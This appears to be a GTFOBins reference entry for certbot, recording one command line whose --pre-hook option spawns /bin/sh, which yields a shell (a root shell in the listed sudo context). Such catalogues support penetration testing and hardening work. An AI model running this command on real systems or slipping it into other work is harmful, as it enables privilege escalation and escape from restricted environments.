<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/certbot -->
---
functions:
  shell:
  - code: |-
      certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0'
    comment: |-
      This needs a writable directory, replace `.` if needed.
    contexts:
      sudo:
      unprivileged:
...
